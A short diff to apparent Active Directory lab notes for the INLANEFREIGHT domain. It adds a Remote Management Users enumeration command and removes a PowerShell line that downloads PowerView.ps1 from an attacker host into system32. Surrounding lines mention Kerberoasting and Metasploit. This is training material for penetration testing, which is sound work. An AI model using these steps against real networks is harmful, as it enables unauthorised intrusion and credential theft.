@@ -332,6 +332,8 @@ runas /netonly /user:INLANEFREIGHT\adunn powershell
 What other user in the domain has CanPSRemote rights to a host? 
 ```powershell
 
+Get-ADGroupMember -Identity "Remote Management Users" -Recursive
+
 ```
 What host can this user access via WinRM? (just the computer name) 
 
@@ -555,7 +557,6 @@ Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and s
 
 ```bash
 # on shell
-Invoke-WebRequest -Uri "http://10.10.16.51:8000/PowerView.ps1" -OutFile "C:\Windows\system32\PowerView.ps1" # send file to linux with powershell
 
 
 msfconsole 
